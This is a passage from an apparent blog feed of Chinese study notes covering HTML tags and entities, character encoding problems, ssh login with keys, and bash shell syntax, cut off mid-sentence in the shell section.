html&gt;的外部</li><li>p元素中嵌套了块元素</li><li>根元素中出现了head和body以外的子元素<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2></li><li>修正的不是源码</li><li>而是源码在内存中的形式</li><li>看的是f12打开后的element元素</li><li><img src="https://s2.loli.net/2022/05/12/5LTbZUdfRzYraI6.png"></li></ol><h1 id="实体-1"><a href="#实体-1" class="headerlink" title="实体"></a>实体</h1><h2 id="在HTML中-lt-gt-这种特殊字符不能直接使用（-lt-gt-会被解析为标签）"><a href="#在HTML中-lt-gt-这种特殊字符不能直接使用（-lt-gt-会被解析为标签）" class="headerlink" title="在HTML中&lt; &gt;这种特殊字符不能直接使用（&lt;&gt;会被解析为标签）"></a>在HTML中&lt; &gt;这种特殊字符不能直接使用（&lt;&gt;会被解析为标签）</h2><ol><li>需要使用一些特殊的符号来表示这些特殊字符，这些特殊符号我们称为实体（转义字符串）</li><li>浏览器解析到实体时，会自动将实体转换为其对应的字符</li></ol><h2 id="在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析"><a href="#在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析" class="headerlink" title="在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析"></a>在HTML中，字符之间写再多的空格，浏览器也会当成一个空格解析，换行也会当成一个空格解析</h2><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ol><li>&amp;实体的名字（将linux系统操作的-换位&amp;）(只能说是一部分)</li><li>小于&lt; -lt</li><li>大于&gt; -gt</li><li>空格&nbsp;(牛逼space)(no break space，即不会换行的空格)</li><li>版权符号 &amp;copy（不让你copy）<h3 id="amp-开头，；结尾"><a href="#amp-开头，；结尾" class="headerlink" title="&amp;开头，；结尾"></a>&amp;开头，；结尾</h3></li></ol><h1 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h1><h2 id="使用img-image-标签来向网页中引入一个外部图片"><a href="#使用img-image-标签来向网页中引入一个外部图片" class="headerlink" title="使用img(image)标签来向网页中引入一个外部图片"></a>使用img(image)标签来向网页中引入一个外部图片</h2><ol><li>img标签也是一个自结束标签<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2></li><li>img标签属于一种替换元素，介于行内元素和块元素之间，具备行内元素和块元素的特点<h3 id="src：设置一个外部图片的路径"><a href="#src：设置一个外部图片的路径" class="headerlink" title="src：设置一个外部图片的路径"></a>src：设置一个外部图片的路径</h3></li><li>路径规则和超链接是一样的，src指定的是外部图片的路径<h3 id="alt：可以用来设置图片的描述"><a href="#alt：可以用来设置图片的描述" class="headerlink" title="alt：可以用来设置图片的描述"></a>alt：可以用来设置图片的描述</h3></li><li>（当图片不能显示时，直接显示alt中的内容），搜索引擎可以通过alt属性来识别不同的图片（百度专门搜索图片的时候就是用alt）</li><li>如果不写alt，搜索引擎将不会对img中的图片进行收录<h3 id="width：可以用来修改图片的宽度，一般使用px为单位（像素）"><a href="#width：可以用来修改图片的宽度，一般使用px为单位（像素）" class="headerlink" title="width：可以用来修改图片的宽度，一般使用px为单位（像素）"></a>width：可以用来修改图片的宽度，一般使用px为单位（像素）</h3><h3 id="height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小"><a href="#height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小" class="headerlink" title="height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小"></a>height：可以用来修改土拍你的高度，一般使用px为单位，宽度和高度如果只设置一个，另一个也会同时等比例调整大小</h3><h2 id="如果两个值同时指定，则按照你指定的值来设置"><a href="#如果两个值同时指定，则按照你指定的值来设置" class="headerlink" title="如果两个值同时指定，则按照你指定的值来设置"></a>如果两个值同时指定，则按照你指定的值来设置</h2></li><li>如果两个值同时指定，则按照你指定的值来设置<h2 id="一般开发中除了自适应页面，不建议设置width和height"><a href="#一般开发中除了自适应页面，不建议设置width和height" class="headerlink" title="一般开发中除了自适应页面，不建议设置width和height"></a>一般开发中除了自适应页面，不建议设置width和height</h2></li><li>让美工话自己想要的大小<h2 id="lt-img-src-”路径”-alt-”图片描述”-gt"><a href="#lt-img-src-”路径”-alt-”图片描述”-gt" class="headerlink" title="&lt; img src=”路径” alt=”图片描述” /&gt;"></a>&lt; img src=”路径” alt=”图片描述” /&gt;</h2><h1 id="图片格式"><a href="#图片格式" class="headerlink" title="图片格式"></a>图片格式</h1></li><li>JPEG(JPG):支持的颜色比较多，图片可以压缩，但是不支持透明(指的是背景透明)，一般用来保存照片等颜色丰富的图片</li><li>GIF：支持的颜色少，只支持简单的透明（背景透明）（但是边界会有白边），支持动态图，图片颜色单一或者是动态图时可以使用gif</li><li>PNG：支持的颜色多，并且支持复杂的透明（背景透明），可以用来显示颜色复杂的透明的图片<h2 id="图片的使用原则："><a href="#图片的使用原则：" class="headerlink" title="图片的使用原则："></a>图片的使用原则：</h2></li><li>效果不一致用好的</li><li>效果一致用小的（jpg一般小于png）</li></ol><h1 id="列表-list"><a href="#列表-list" class="headerlink" title="列表(list)"></a>列表(list)</h1><h2 id="成组出现"><a href="#成组出现" class="headerlink" title="成组出现"></a>成组出现</h2><ol><li><img src="https://s2.loli.net/2022/05/13/UJNDSeWis49Hnzk.png"></li></ol><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><ol><li>使用ul标签来创建无序标签</li><li>使用li表示列表项</li><li><img src="https://s2.loli.net/2022/05/13/1LZPmuA2fd7RUn3.png"></li><li><img src="https://s2.loli.net/2022/05/13/vVdlJ4HmbXiaYPZ.png"></li></ol><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><ol><li>使用ol标签来创建有序标签</li><li><img src="https://s2.loli.net/2022/05/13/wCnWDPHkm3GV7yR.png"></li></ol><h2 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h2><ol><li>为一些东西下定义</li><li>使用&lt; dl&gt;标签来创建定义列表</li><li>使用&lt; dd&gt;标签来对内容进行解释说明</li><li>使用下拉菜单时可以使用</li></ol><h2 id="列表之间可以互相嵌套"><a href="#列表之间可以互相嵌套" class="headerlink" title="列表之间可以互相嵌套"></a>列表之间可以互相嵌套</h2><p><img src="https://s2.loli.net/2022/05/13/ezo4qlruRNcmdZ1.png"></p><h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><h2 id="超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置"><a href="#超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置" class="headerlink" title="超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置"></a>超链接可以让我们从一个页面跳转到其它页面，或者当前页面的其它位置</h2><h2 id="lt-a-gt"><a href="#lt-a-gt" class="headerlink" title="&lt; a&gt;"></a>&lt; a&gt;</h2><ol><li>使用a标签来创建超链接</li><li>是一个行内元素</li><li>&lt; a&gt;标签中可以放任何元素</li></ol><h3 id="属性href"><a href="#属性href" class="headerlink" title="属性href"></a>属性href</h3><ol><li>href指定跳转的目标路径<br><img src="https://s2.loli.net/2022/05/13/LnEjVowTU79uS8r.png"></li><li>值可以是一个外部页面的地址</li><li>也可以写一个内部页面的地址</li><li>当在同一个目录下，可以写相对于当前目录的地址</li></ol><h3 id="可以写绝对路径"><a href="#可以写绝对路径" class="headerlink" title="可以写绝对路径"></a>可以写绝对路径</h3><h3 id="也可以写相对路径"><a href="#也可以写相对路径" class="headerlink" title="也可以写相对路径"></a>也可以写相对路径</h3><ol><li>当我们需要跳转到服务器内部的页面时，一般用相对路径</li><li>./可以省略不写，如果不写./，也不写../，则相当于写了./</li><li>./07.html和07.html相同<br><img src="https://s2.loli.net/2022/05/13/YwThiqOKbHr5eQA.png"></li></ol><h3 id="通过颜色的区别来区分"><a href="#通过颜色的区别来区分" class="headerlink" title="通过颜色的区别来区分"></a>通过颜色的区别来区分</h3><ol><li>紫色的是点过的</li><li>蓝色的是没有点过的</li></ol><h2 id="超链接的其它用法"><a href="#超链接的其它用法" class="headerlink" title="超链接的其它用法"></a>超链接的其它用法</h2><h3 id="跳转出一个新的页面，而不是覆盖掉当前页面"><a href="#跳转出一个新的页面，而不是覆盖掉当前页面" class="headerlink" title="跳转出一个新的页面，而不是覆盖掉当前页面"></a>跳转出一个新的页面，而不是覆盖掉当前页面</h3><h4 id="target属性"><a href="#target属性" class="headerlink" title="target属性"></a>target属性</h4><ol><li>_self默认值，在当前页面中打开超链接</li><li>_blank,在一个新的页面中打开超链接</li><li>国内用_blank很多，但是会在不经意间打开很多窗口，所以国外使用_self较多</li></ol><h3 id="回到顶部"><a href="#回到顶部" class="headerlink" title="回到顶部"></a>回到顶部</h3><ol><li>可以将超链接的href属性设置为#,这样点击超链接之后，页面不会发生跳转，而是转到当前页面的顶部位置<pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;#&quot;,target&#x3D;&quot;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="回到底部"><a href="#回到底部" class="headerlink" title="回到底部"></a>回到底部</h3><ol><li>没有特殊的回到底部的href属性</li><li>可以通过设置id属性，使其跳转到”回到顶部”标签所在的位置</li><li>当id重复时，前面的id具有优先性，起那面的会生效</li></ol><h3 id="id属性"><a href="#id属性" class="headerlink" title="id属性"></a>id属性</h3><ol><li>唯一不重复的</li><li>每一个标签都可以添加一个id属性</li><li>id属性就是元素的唯一标识，同一个页面中不能出现重复的id属性</li><li>一般id的格式都是先一个小写英文字母，后数字<pre class="line-numbers language-none"><code class="language-none">&lt;a href&#x3D;&quot;#p3&quot;&gt;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="跳转到指定位置"><a href="#跳转到指定位置" class="headerlink" title="跳转到指定位置"></a>跳转到指定位置</h3><ol><li>只需要将href属性设置为：#目标元素的id属性值</li></ol><h3 id="作为占位符"><a href="#作为占位符" class="headerlink" title="#作为占位符"></a>#作为占位符</h3><ol><li>在开发中可以将#作为超链接的占位符使用</li></ol><h1 id="生成随机文本"><a href="#生成随机文本" class="headerlink" title="生成随机文本"></a>生成随机文本</h1><h2 id="lorem"><a href="#lorem" class="headerlink" title="lorem"></a>lorem</h2><ol><li>格式：lorem + 单词数量</li><li><img src="https://img-blog.csdn.net/20170802213142346?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxNDI5MTQ5Nw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"></li><li>乱数假文，用于排版领域来测试不同文本下的显示状态</li></ol><h1 id="内联框架"><a href="#内联框架" class="headerlink" title="内联框架"></a>内联框架</h1><ol><li>用于向当前页面中引入一个其它页面<h2 id="lt-iframe-gt-，参数"><a href="#lt-iframe-gt-，参数" class="headerlink" title="&lt; iframe&gt;，参数"></a>&lt; iframe&gt;，参数</h2></li><li>src=””,被引入的页面</li><li>width=””</li><li>height=””</li><li>frameborder:””内联框架的边框，0表示没有，1表示有</li></ol><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><ol><li>内联框架中的东西不会被搜索引擎所检索，即内联框架是一个标签而已</li></ol><h1 id="音频播放"><a href="#音频播放" class="headerlink" title="音频播放"></a>音频播放</h1><h2 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="&lt; audio&gt;"></a>&lt; audio&gt;</h2><ol><li>向一个页面中引入一个外部的音频文件</li><li>音视频文件引入时，默认情况下不允许自己控制播放停止<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>添加属性controls是否允许用户控制播放，想则写，不想则不写（通过是否来判断）<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot; controls&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>autoplay 音频文件是否自动播放,但是大部分浏览器都不会自动对音乐进行播放（但是为了防止轰一下吓人一跳，提升用户体验，则不会自动播放）<pre class="line-numbers language-none"><code class="language-none">&lt;audio src&#x3D;&quot;&quot; controls autoplay&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>loop 循环播放</li></ol><h3 id="更标准的格式"><a href="#更标准的格式" class="headerlink" title="更标准的格式"></a>更标准的格式</h3><ol><li>除了可以通过src来指定外部文件的路径以外，还可以通过source来指定文件路径</li><li>支持&lt; audio&gt;标签的可以，不支持的忽略标签，但是中间的文字就可以暴露出来了<pre class="line-numbers language-none"><code class="language-none">&lt;audio controls&gt;    对不起，您的浏览器不支持播放音频，请升级浏览器    &lt;source src&#x3D;&quot;路径.mp3&quot;&gt;    &lt;source src&#x3D;&quot;路径.ogg&quot;&gt;&lt;&#x2F;audio&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>mp3和ogg都要写，因为有的浏览器不支持mp3，如果不支持第一个，可以播放第二个，有效地解决浏览器兼容性问题<h1 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h1><h2 id="video标签来引入视频文件"><a href="#video标签来引入视频文件" class="headerlink" title="video标签来引入视频文件"></a>video标签来引入视频文件</h2><pre class="line-numbers language-none"><code class="language-none">&lt;video controls&gt;    &lt;source src&#x3D;&quot;&quot;&gt;    &lt;source src&#x3D;&quot;&quot;&gt;&lt;&#x2F;video&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="IE浏览器模拟IE11或更低等级的方法"><a href="#IE浏览器模拟IE11或更低等级的方法" class="headerlink" title="IE浏览器模拟IE11或更低等级的方法"></a>IE浏览器模拟IE11或更低等级的方法</h1><ol><li>f12打开开发者工具</li><li>选择文档模拟器<br><img src="https://s2.loli.net/2022/05/14/BptZMhvkOLVF73N.png"></li><li>即可模拟IE11及以下的内核<br><img src="https://s2.loli.net/2022/05/14/hSKZ8sCwyuTl7Rd.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>乱码问题</title>
      <link href="/%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E5%92%8C%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F/"/>
      <url>/%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98%E5%92%8C%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="乱码问题"><a href="#乱码问题" class="headerlink" title="乱码问题"></a>乱码问题</h1><h3 id="乱码出现的原因：编码和解码所采用的字符集不同"><a href="#乱码出现的原因：编码和解码所采用的字符集不同" class="headerlink" title="乱码出现的原因：编码和解码所采用的字符集不同"></a>乱码出现的原因：编码和解码所采用的字符集不同</h3><ol><li>计算机只认识0和1</li><li>在计算机中保存的任何内容，最终都需要用二进制编码保存，包括网页中的内容</li><li>在读取内容时，需要将二进制编码再转换为正确的内容<h3 id="编码：依据一定的规则，将字符转换为二进制编码的过程"><a href="#编码：依据一定的规则，将字符转换为二进制编码的过程" class="headerlink" title="编码：依据一定的规则，将字符转换为二进制编码的过程"></a>编码：依据一定的规则，将字符转换为二进制编码的过程</h3><h3 id="解码：一句一定的规则，将二进制编码转换为字符的过程"><a href="#解码：一句一定的规则，将二进制编码转换为字符的过程" class="headerlink" title="解码：一句一定的规则，将二进制编码转换为字符的过程"></a>解码：一句一定的规则，将二进制编码转换为字符的过程</h3><h2 id="字符集：编码和解码所采用的规则"><a href="#字符集：编码和解码所采用的规则" class="headerlink" title="字符集：编码和解码所采用的规则"></a>字符集：编码和解码所采用的规则</h2></li><li>ASCII：７位０\１,128个</li><li>ISO－８８５９－１,8位0\1，256个</li><li>GBK：国标</li><li>GB２３１２：国标，中文系统的默认编码</li><li>UTF－８：万国码，支持地球上所有的文字(即unicode编码)</li><li>ANSI：自动以系统默认的编码来保存文件<h3 id="在中文系统浏览器中，默认都是使用GB２３１２进行解码"><a href="#在中文系统浏览器中，默认都是使用GB２３１２进行解码" class="headerlink" title="在中文系统浏览器中，默认都是使用GB２３１２进行解码"></a>在中文系统浏览器中，默认都是使用GB２３１２进行解码</h3><h2 id="使用notepad-可以直接将网页拖入，显示网页的源代码"><a href="#使用notepad-可以直接将网页拖入，显示网页的源代码" class="headerlink" title="使用notepad++可以直接将网页拖入，显示网页的源代码"></a>使用notepad++可以直接将网页拖入，显示网页的源代码</h2><h2 id="更改编码：在notepad-中，上方的菜单栏中选编码"><a href="#更改编码：在notepad-中，上方的菜单栏中选编码" class="headerlink" title="更改编码：在notepad++中，上方的菜单栏中选编码"></a>更改编码：在notepad++中，上方的菜单栏中选编码</h2><h2 id="更改浏览器解码方式"><a href="#更改浏览器解码方式" class="headerlink" title="更改浏览器解码方式"></a>更改浏览器解码方式</h2><h2 id="：meta是一个自结束标签，最后加上-表示结束"><a href="#：meta是一个自结束标签，最后加上-表示结束" class="headerlink" title="：meta是一个自结束标签，最后加上/表示结束"></a><meta charset="字符集" />：meta是一个自结束标签，最后加上/表示结束</h2><h2 id="txt中可以在保存的时候选择编码方式"><a href="#txt中可以在保存的时候选择编码方式" class="headerlink" title="txt中可以在保存的时候选择编码方式"></a>txt中可以在保存的时候选择编码方式</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编码 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh</title>
      <link href="/ssh/"/>
      <url>/ssh/</url>
      
        <content type="html"><![CDATA[<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><h3 id="远程登录服务器"><a href="#远程登录服务器" class="headerlink" title="远程登录服务器"></a>远程登录服务器</h3><ol><li>ssh user@hostname(user为用户名，hostname为IP地址或域名)</li><li>默认登录端口为22号，如果想要登录某一特定端口：ssh user@hostname -p 22<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3></li><li>创建文件~/.ssh/config</li><li>输入Host myserver1</li><li>\t,HostName IP地址或域名</li><li>\t，User 用户名<h3 id="密钥登录"><a href="#密钥登录" class="headerlink" title="密钥登录"></a>密钥登录</h3></li><li>ssh-keygen(key generation),然后一直回车</li><li>执行结束后~/.ssh/目录下会多两个文件</li><li>id_rsa和(私钥)id_rsa.pub(公钥)</li><li>之后想要免密登录哪个服务器，即可将公钥传给哪个服务器即可</li><li>例如想要免密登录myserver。则将公钥中的内容复制到myserver中的~/.ssh/authorized_keys文件中即可</li><li>也可以使用命令一键添加公钥：ssh-copy-id myserver<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3></li><li>格式：ssh user@hostname command</li><li>ssh user@hostname ls -a</li><li>ssh myserver <code>for ((i = 0; i &lt; 10; i ++ )) do echo $i;done</code><h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> ssh </category>
          
          <category> 远程登录服务器 </category>
          
          <category> 密钥 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> 远程登录服务器 </tag>
            
            <tag> 密钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell语法</title>
      <link href="/shell%E8%AF%AD%E6%B3%95/"/>
      <url>/shell%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="shell语法"><a href="#shell语法" class="headerlink" title="shell语法"></a>shell语法</h1><h2 id="一门新的语言"><a href="#一门新的语言" class="headerlink" title="一门新的语言"></a>一门新的语言</h2><h2 id="Linux中常见的脚本"><a href="#Linux中常见的脚本" class="headerlink" title="Linux中常见的脚本"></a>Linux中常见的脚本</h2><ol><li>sh:/usr/bin/sh或/bin/sh</li><li>bash:/bin/bash</li><li>csh:/usr/bin/csh</li><li>ksh:/usr/bin/ksh</li><li>zsh<h2 id="开头必须使用-bin-bash指名bash为脚本解释器"><a href="#开头必须使用-bin-bash指名bash为脚本解释器" class="headerlink" title="开头必须使用 #! /bin/bash指名bash为脚本解释器"></a>开头必须使用 #! /bin/bash指名bash为脚本解释器</h2><h2 id="运行方式："><a href="#运行方式：" class="headerlink" title="运行方式："></a>运行方式：</h2><h3 id="作为可执行文件："><a href="#作为可执行文件：" class="headerlink" title="作为可执行文件："></a>作为可执行文件：</h3></li><li>chmod +x test.sh使脚本具有可执行权限</li><li>./test.sh当前路径下执行（相对路径）</li><li>/home/acs/test.sh绝对路径下执行</li><li>~/test.sh家目录下执行<h3 id="用解释器执行"><a href="#用解释器执行" class="headerlink" title="用解释器执行"></a>用解释器执行</h3></li><li>bash test.sh<h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2></li><li>意思和c++中cout 或 printf相同<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2></li><li>井号后面的都是注释，（与py相同）</li><li>其实脚本解释的时候#! /bin/bash解释的时候也是注释，只是系统识别为脚本解释器</li><li>多行注释：前 :&lt;&lt;EOF后：EOF;其中EOF也可以换成其他字符串，或者符号（必须首位相同）<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h3></li><li>定义变量不需要￥符号</li><li>name1=’yxc’ （单引号定于字符串）</li><li>name2=”yxc” (双引号定义字符串)</li><li>name3=yxc (可以不加引号，同样表示字符串)</li><li>注意等号两边不能有空格！！！否则会报错<h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3></li><li>使用变量需要加上￥（此符号在bash中意为取值），或者$（），花括号是可选的，主要是为了帮助解释器识别边界</li><li>echo $yxc</li><li>echo $(yxc)</li><li>echo会自动换行</li><li>错误：echo $namesacwing，因为没有括号，边界判断不对，不知道是namesacwing还是names<h3 id="只读变量"><a href="#只读变量" class="headerlink" title="只读变量"></a>只读变量</h3></li><li>readonly 变量(相当于c++中的const,声明了一个只读变量)        </li><li>declare -r 变量<h3 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h3></li><li>unset(类似于c++终端undef),如果一个变量被删除，后面调用的时候会替换为空（NULL）<h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3></li><li>自定义变量（局部变量）：子进程不能访问的变量</li><li>环境变量（全局变量）：子进程可以访问的变量<h3 id="自定义变量转环境变量"><a href="#自定义变量转环境变量" class="headerlink" title="自定义变量转环境变量"></a>自定义变量转环境变量</h3></li><li>export 变量名</li><li>declare -x 变量名</li><li>此时可以在子进程中使用变量              <h3 id="使用bash"><a href="#使用bash" class="headerlink" title="使用bash"></a>使用bash</h3></li><li>使用bash会将原进程bash睡眠掉，进入一个新的bash子进程</li><li>退出：exit或者ctrl+d          <h3 id="环境变量转自定义变量"><a href="#环境变量转自定义变量" class="headerlink" title="环境变量转自定义变量"></a>环境变量转自定义变量</h3></li><li>declare +x 变量名(可以理解为给变量赋予了自定义权限)<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2></li><li>字符串可以使用单引号，也可以使用双引号，也可以不使用引号<h3 id="单引号和双引号的区别（不加引号和双引号相同）"><a href="#单引号和双引号的区别（不加引号和双引号相同）" class="headerlink" title="单引号和双引号的区别（不加引号和双引号相同）"></a>单引号和双引号的区别（不加引号和双引号相同）</h3></li><li>单引号中的内容会原样输出，不会执行，不会取变量（即不会转义），即没有使用&amp;符号取值</li><li>双引号中的内容可以执行，可以取变量，即可以使用&amp;取值<h3 id="取出字符串的长度"><a href="#取出字符串的长度" class="headerlink" title="取出字符串的长度"></a>取出字符串的长度</h3></li><li>￥后面加井号</li><li>echo ${井号name},即可以取出name的长度（注意这个地方是花括号）<h3 id="提取子串"><a href="#提取子串" class="headerlink" title="提取子串"></a>提取子串</h3></li><li>根据下标取值</li><li>echo ${name:m:n}注意这个每一个下标前都有冒号<h2 id="查看自己开了多少进程"><a href="#查看自己开了多少进程" class="headerlink" title="查看自己开了多少进程"></a>查看自己开了多少进程</h2></li><li>top可以查看</li><li>按下<q>退出<h2 id="文件参数变量"><a href="#文件参数变量" class="headerlink" title="文件参数变量"></a>文件参数变量</h2></li><li>在执行shell脚本时可以想脚本传递参数，$1时第一个参数，$2是第二个参数…，特殊的是$0是文件名（包含路径）</li><li>$#:文件传入参数的个数（不包括文件名）</li><li>$*：由所有参数构成的用空格隔开的字符串，整体为字符串用双引号括起来</li><li>$@:每个参数分别用双引号括起来的字符串（@和*都是取所有的意思）</li><li>$$:脚本当前运行的进程ID</li><li>$?:上一条命令的退出状态（注意不是stdout,而是exit code）,0表示正常退出，其他值表示错误</li><li>$(command):返回command这条命令的stdout(注意区分stdout和exit code,输出的数是stdout,例如cout,而退出状态是exit code,例如c++中的return)</li><li><code>command</code> 返回command这条命令的stdout,（~上面的`）（7，8等价）<h3 id="小括号是获取stdout的值，-是取变量的值"><a href="#小括号是获取stdout的值，-是取变量的值" class="headerlink" title="$()小括号是获取stdout的值，${}是取变量的值"></a>$()小括号是获取stdout的值，${}是取变量的值</h3><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2></li><li>数组中可以存放多个不同的值，只支持一位数组，初始化时不需要指定数组大小（和py中的list一样不需要指定数组大小）<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3></li><li>数组用小括号表示，元素之间用空格隔开，如：array=(1 abc “def” yxc)</li><li>也可以直接定义数组中某个元素的值，如：array[0]=1,array[1]=abc,array[2]=”def”<h3 id="读取数组中某个元素的值"><a href="#读取数组中某个元素的值" class="headerlink" title="读取数组中某个元素的值"></a>读取数组中某个元素的值</h3></li><li>格式:${array[index]}</li><li>echo ${array[0]}<h3 id="读取整个数组"><a href="#读取整个数组" class="headerlink" title="读取整个数组"></a>读取整个数组</h3></li><li>格式：（@和*都是取所有的意思）</li><li>$(array[@])</li><li>$(array[*])<h2 id="expr命令"><a href="#expr命令" class="headerlink" title="expr命令"></a>expr命令</h2></li><li>格式：expr 表达式<br>####说明：</li><li>用空格隔开每一项</li><li>用反斜杠放在shell特定的字符前面，发现表达式运行错误时，可以试试转义</li><li>包含空格和其他特殊字符的字符串要用引号括起来  </li><li>expr会在stdout中输出结果，如果结果为真，stdout为1，否则为0</li><li>expr也有exit code返回值，如果为真，exit code为0，否则为1</li><li>stdout 和 exit code 返回值为互反（真时相反，假时也相反）<h3 id="字符串表达式（以下参数都是在expr后面的）"><a href="#字符串表达式（以下参数都是在expr后面的）" class="headerlink" title="字符串表达式（以下参数都是在expr后面的）"></a>字符串表达式（以下参数都是在expr后面的）</h3></li><li>输出长度：length STRING:返回STRING的长度</li><li>index STRING CHARSET:CHARSET中任意单个字符在STRING中最前面的字符位置，下标从１开始。如果子啊STRING中完全不存在CHARSET中的字符，则返回0</li><li>substr STRING POSITION LENGTH 返回STRING字符串中从POSITON开始，长度最大为LENGTH的子串。如果POSITION或LENGTH为负数，0或非数值，则返回空字符串（下标从1开始）          　        <h3 id="整数表达式"><a href="#整数表达式" class="headerlink" title="整数表达式"></a>整数表达式</h3></li><li>expr支持普通算数操作，算数表达式优先级低于字符串表达式，高于逻辑表达式</li><li><ul><li>— 加减运算，两端参数会转化为整数，如果转化失败则会报错</li></ul></li><li>*  / % 乘除取余运算，两端参数会转化为整数（*在shell中有特殊含义，所以需要转义）</li><li>（）可以表示优先级，但是需要用反斜杠转义<h3 id="逻辑表达式"><a href="#逻辑表达式" class="headerlink" title="逻辑表达式"></a>逻辑表达式</h3></li><li>| 或（c++中是||,少一半）：如果第一个值不是0，则会返回第一个值，第二个值不会计算，如果第一个参数非空并且非0，则会返回第一个参数的值</li><li>&amp; 与 (c++中是&amp;&amp;，少一半)：如果第一个值是0，则不会计算第二个值（短路特性），如果都非空并且非0，则会返回第一个值   </li><li>== 与 = 是同义词，但是还是要按照c++来写逻辑等号==，复制=</li><li>&lt; &lt;= &gt; &gt;= != == = 比较两端的参数，如果为true则返回1，否则返回0，expr首先尝试将两端的参数转换为整数，并做算数比较，如果转换失败，则按字符集排序规则做字符比较（strcmp）</li><li>需要转义的：*、（）、&gt;、&lt;=、|、&amp;</li><li>echo expr a + b加号和数字之间有空格<pre><code>                                                                                                                                                                                                                                                                                                                                                                                                                                                       ### read命令（cin或scanf）</code></pre></li><li>用于从标准输入中读入单行数据，当读到文件结束符时，exit code为1，否则为0</li><li>-p 添加提示信息(类似于input（提示信息）)</li><li>-t 后面跟秒数，定义输入字符的等待时间，超过等待时间后会自动忽略此命令<h3 id="echo命令（相当于cout或printf）"><a href="#echo命令（相当于cout或printf）" class="headerlink" title="echo命令（相当于cout或printf）"></a>echo命令（相当于cout或printf）</h3></li><li>输出格式：echo STRING</li><li>显示普通字符串：echo “Hello acterminal”,引号也可以省略</li><li>显示转义字符：echo “&quot;Hello acterminal&quot;“注意只能使用双引号，单引号不能够转义</li><li>也可以省略最外面表示字符串的双引号：echo &quot;Hello acterminal&quot;</li><li>显示变量：注意一定要用双引号，单引号不能够转义：name=yxc echo “My name is 